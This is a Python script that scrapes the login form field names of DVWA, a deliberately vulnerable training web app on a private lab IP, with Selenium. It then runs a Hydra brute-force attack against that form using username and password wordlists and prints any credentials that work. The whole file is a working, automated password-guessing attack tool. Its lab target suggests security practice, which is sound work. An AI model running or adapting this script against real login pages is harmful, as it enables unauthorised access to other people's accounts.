from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
import time
import subprocess


options = Options()
options.binary_location = "/usr/bin/firefox"

service = Service(executable_path='/usr/local/bin/geckodriver')
driver = webdriver.Firefox(service=service, options=options)
driver.get("http://192.168.186.208/dvwa/login.php")

time.sleep(2)

userName = driver.find_element(By.XPATH, "/html/body/div/form/fieldset/input[1]")
nameValue = userName.get_attribute('name')
print("Name Value : ", nameValue)

passwordName = driver.find_element(By.XPATH, "/html/body/div/form/fieldset/input[2]")
passwordValue = passwordName.get_attribute('name')
print("Password Value : ", passwordValue)

loginBtn = driver.find_element(By.XPATH, "/html/body/div/form/fieldset/p/input")
loginBtnValue = loginBtn.get_attribute('name')
print("Login Button Value : ", loginBtnValue)

driver.close()

outputFile = "finalOutput.txt"

hydraCommand = [
    "hydra",
    "192.168.186.208",
    "http-form-post",
    f"/dvwa/login.php:{nameValue}=^USER^&{passwordValue}=^PASS^&{loginBtnValue}=submit:Login failed",
    "-L", "user.txt",
    "-P", "password.txt",
    "-o", outputFile
]

try:
    subprocess.run(hydraCommand, check=True)
    print("Hydra completed successfully.")
except subprocess.CalledProcessError as e:
    print("An Error Occurred:", e)


try:
    with open(outputFile, 'r') as f:
        successLogin = f.readlines()
        if successLogin:
            print("Login Successfully : ")
            for i in successLogin:
                print(i.strip())
        else:
            print("No Successful Login Found from the Given Input.")
except FileNotFoundError:
    print(f"The Output File {outputFile} was not Found!")
